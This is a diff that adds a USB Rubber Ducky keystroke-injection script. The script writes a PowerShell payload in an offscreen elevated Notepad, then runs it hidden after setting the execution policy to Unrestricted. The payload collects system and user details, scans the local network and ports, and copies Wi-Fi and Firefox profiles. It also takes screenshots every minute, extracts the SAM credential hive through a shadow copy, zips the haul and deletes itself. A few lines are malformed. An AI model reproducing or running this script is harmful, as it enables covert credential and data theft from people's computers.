@@ -1,0 +1,276 @@
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+DELAY 750
+ALT y
+DELAY 750
+ENTER
+ALT SPACE
+DELAY 1000
+STRING m
+DELAY 1000
+DOWNARROW
+REPEAT 100
+ENTER
+STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss')
+ENTER
+STRING $userDir = (Get-ChildItem env:\userprofile).value + '\Ducky Report ' + $folderDateTime
+ENTER
+STRING $fileSaveDir = New-Item  ($userDir) -ItemType Directory 
+ENTER
+STRING $date = get-date 
+ENTER
+STRING $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
+ENTER
+STRING $Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html' 
+ENTER
+STRING $Report = $Report + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
+ENTER
+STRING $UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired  
+ENTER 
+STRING $UserType = $UserInfo.AccountType 
+ENTER
+STRING $UserSid = $UserInfo.SID
+ENTER  
+STRING $UserPass = $UserInfo.PasswordRequired 
+ENTER 
+STRING $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator') 
+ENTER 
+STRING $Report =  $Report + "<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>" 
+ENTER  
+STRING $Report = $Report + '</div>' 
+ENTER
+STRING  $u = 0 
+ENTER 
+STRING $allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace) 
+ENTER
+STRING $Report =  $Report + '<div id=right><h3>USB Devices</h3><table>' 
+ENTER 
+STRING do { 
+ENTER
+STRING $gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB) 
+ENTER
+STRING $Report = $Report + "<tr><td>Drive Name: </td><td> " + $allUsb[$u].Name + $allUsb[$u].Label + "</td><td>Free Space: </td><td>" + $gbUSB + "GB</td></tr>"
+ENTER
+STRING Write-Output $fullUSB
+ENTER 
+STRING $u ++ 
+ENTER 
+STRING } while ($u -lt $allUsb.Count) 
+ENTER 
+STRING $Report = $Report + '</table></div>' 
+ENTER
+STRING $Report =  $Report + '<div id=center><h3> Installed Updates</h3>'  
+ENTER 
+STRING $Report =  $Report +  (Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | sort-object -property installedon -Descending | ConvertTo-Html   Description, HotFixId,Installedon,InstalledBy) 
+ENTER  
+STRING $Report = $Report + '</div>' 
+ENTER
+STRING $Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>' 
+ENTER 
+STRING $Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.pdf, *.zip, *.rar -Recurse |convertto-html Directory, Name, LastAccessTime) 
+ENTER  
+STRING $Report = $Report + '</div>' 
+ENTER
+STRING $Report =  $Report + '<div id=center><h3>Network Information</h3>' 
+ENTER 
+STRING $Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html) 
+ENTER  
+STRING $Report = $Report + '</table></div>' 
+ENTER
+STRING $IP = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter 'IPEnabled = True' | Select IPAddress -First 1
+ENTER
+STRING $IPAddr = $IP.IPAddress | Select-Object -Index 0 
+ENTER 
+STRING $IPAddr -as [String] 
+ENTER
+STRING $IPa = $IPAddr.Split('.') | Select -Index 0 
+ENTER
+STRING $IPb = $IPAddr.Split('.') | Select -Index 1 
+ENTER 
+STRING $IPc = $IPAddr.Split('.') | Select -Index 2 
+ENTER
+STRING $IPAddr = $IPa + '.' + $IPb + '.' + $IPc + '.' 
+ENTER 
+STRING $Ping = new-object System.Net.Networkinformation.Ping 
+ENTER
+STRING $ScanResults = .. | ForEach-Object {($Ping).Send($IpAddr + $_) } | Where-Object {$_.Status -eq 'Success'} | select Address 
+ENTER
+STRING $x = 0 
+ENTER 
+STRING $Report = $Report  + '<div id=center><h3>Network Scan Results</h3><table>' 
+ENTER
+STRING do { 
+ENTER 
+STRING $IPResults = $ScanResults |  Select-Object -Index $x 
+ENTER
+STRING $CompInfo = Get-WmiObject Win32_OperatingSystem -Computer $IPResults.Address | Select RegisteredUser, SystemDirectory  
+ENTER
+STRING $CompName = (Get-WmiObject Win32_OperatingSystem -Computer $IPResults.Address).csname 
+ENTER
+STRING $CurrIP = $IPResults.Address.IPAddressToString 
+ENTER 
+STRING $CurrOS = $CompInfo.SystemDirectory 
+ENTER
+STRING $CurrName = $CompInfo.RegisteredUser 
+ENTER 
+STRING if ($CompInfo -ne $null){ 
+ENTER 
+STRING $Report = $Report  + '<tr><td><b>IP Address:</b></td><td>' + $CurrIP + '</td><td><b>Compter Name: </b></td><td>' + $CompName + '</td><td><b>User Name: </b></td><td>' + $CurrName + '</td> <td><b>OS:</b> </td><td>' + $CurrOS + '</td></tr><br>' 
+ENTER 
+STRING }else{ 
+ENTER
+STRING $Report = $Report  + '<tr><td><b>IP Address: </b></td><td>' + $CurrIP + '</td><td><b>Computer Name: </b></td><td>NOT KNOWN</td><td><b>User Name: </b></td><td>NOT KNOWN</td><td><b>OS:</b></td><td>NOT KNOWN</td></tr><br>'} 
+ENTER 
+STRING $x ++ 
+ENTER 
+STRING } while ($x -lt $ScanResults.Count)
+ENTER 
+STRING $Report = $Report + '</table></div>' 
+ENTER
+STRING $Computer = $env:COMPUTERNAME
+ENTER
+STRING $PortList = 0, 21, 22, 23, 25, 79, 80, 110, 113, 119, 135, 137, 139, 143, 389, 443, 445, 1002, 1024, 1030, 1720, 1900, 5000, 8080
+ENTER 
+STRING $Report = $Report  + '<div id=right><h3>Port Scan of ' + $Computer + '</h3><table>' 
+ENTER 
+STRING foreach ($PortNumber in $PortList) { 
+ENTER
+STRING $PortCheck = New-Object Net.Sockets.TcpClient 
+ENTER 
+STRING $PortCheck.Connect($Computer, $PortNumber) 
+ENTER 
+STRING if ($PortCheck.Connected) { 
+ENTER
+STRING $Report = $Report  +  '<tr><td><b><font color=red>Port ' + $PortNumber + ' is open</font></b></td></tr>'} 
+ENTER
+STRING else {$Report = $Report  +  '<tr><td>Port ' + $PortNumber + ' is closed</td></tr>'}} 
+ENTER
+STRING $Report = $Report + '</table></div>' 
+ENTER
+STRING $wlanSaveDir = New-Item $userDir'\Duck\WLAN_PROFILES' -ItemType Directory
+ENTER 
+STRING $srcDir = 'C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces'
+ENTER 
+STRING Copy-Item $srcDir $wlanSaveDir -Recurse  
+ENTER
+STRING $jpegSaveDir = New-Item $fileSaveDir'\Screenshots' -ItemType Directory
+ENTER
+STRING $x = 0
+ENTER
+STRING do { Start-Sleep -Seconds 60
+ENTER
+STRING $jpegName = (get-date).ToString('HHmmss')
+ENTER
+STRING $File = "$jpegSaveDir\$jpegName.bmp"
+ENTER
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+STRING Add-type -AssemblyName System.Drawing
+ENTER
+STRING $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+ENTER
+STRING $Width = $Screen.Width
+ENTER
+STRING $Height = $Screen.Height
+ENTER
+STRING $Left = $Screen.Left
+ENTER
+STRING $Top = $Screen.Top
+ENTER
+STRING $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+ENTER
+STRING $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+ENTER
+STRING $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+ENTER
+STRING $bitmap.Save($File)
+ENTER
+STRING $x++  } while ($x -ne );
+ENTER
+STRING $fireSaveDir = New-Item $userDir'\Duck\FireFox-Profile' -ItemType Directory
+ENTER
+STRING $fireDir = (Get-ChildItem env:userprofile).value + '\AppData\Roaming\Mozilla\Firefox\Profiles'
+ENTER
+STRING $getFire = Get-Item -Path $fireDir -Exclude extensions 
+ENTER
+STRING Copy-Item $getFire $fireSaveDir -Recurse 
+ENTER 
+STRING Start-Sleep -s 10 
+ENTER
+STRING $createShadow = (gwmi -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')
+ENTER
+STRING $shadow = gwmi Win32_ShadowCopy | ? { $_.ID -eq $createShadow.ShadowID } 
+ENTER
+STRING $addSlash  = $shadow.DeviceObject + '\' 
+ENTER
+STRING cmd /c mklink C:\shadowcopy $addSlash
+ENTER
+STRING Copy-Item 'C:\shadowcopy\Windows\System32\config\SAM' $fileSaveDir
+ENTER
+STRING Remove-Item -recurse -force 'C:\shadowcopy'
+ENTER
+STRING $Report >> $fileSaveDir'/ComputerInfo.html' 
+ENTER
+STRING function copy-ToZip($fileSaveDir){ 
+ENTER 
+STRING $srcdir = $fileSaveDir 
+ENTER
+STRING $zipFile = '\Report.zip'
+ENTER
+STRING if(-not (test-path($zipFile))) { 
+ENTER
+STRING set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
+ENTER 
+STRING (dir $zipFile).IsReadOnly = $false} 
+ENTER
+STRING $shellApplication = new-object -com shell.application
+ENTER 
+STRING $zipPackage = $shellApplication.NameSpace($zipFile) 
+ENTER
+STRING $files = Get-ChildItem -Path $srcdir 
+ENTER 
+STRING foreach($file in $files) { 
+ENTER
+STRING $zipPackage.CopyHere($file.FullName) 
+ENTER 
+STRING while($zipPackage.Items().Item($file.name) -eq $null){ 
+ENTER
+STRING Start-sleep -seconds 1 }}} 
+ENTER 
+STRING copy-ToZip($fileSaveDir) 
+ENTER
+STRING remove-item $fileSaveDir -recurse 
+ENTER
+STRING Remove-Item $MyINvocation.InvocationName 
+ENTER
+CTRL s
+DELAY 750    
+STRING C:\Windows\config-10134.ps1
+ENTER
+DELAY 1000
+ALT F4 
+DELAY 750  
+GUI r 
+DELAY 500 
+STRING powershell Start-Process cmd -Verb runAs 
+ENTER
+DELAY 1000
+ALT y 
+DELAY 750   
+STRING mode con:cols=14 lines=1 
+ENTER
+ALT SPACE 
+DELAY 750  
+STRING m 
+DELAY 1000
+DOWNARROW 
+REPEAT 100
+ENTER
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false 
+ENTER 
+DELAY 750  
+STRING powershell.exe -windowstyle hidden -File C:\Windows\config-10134.ps1
+ENTER
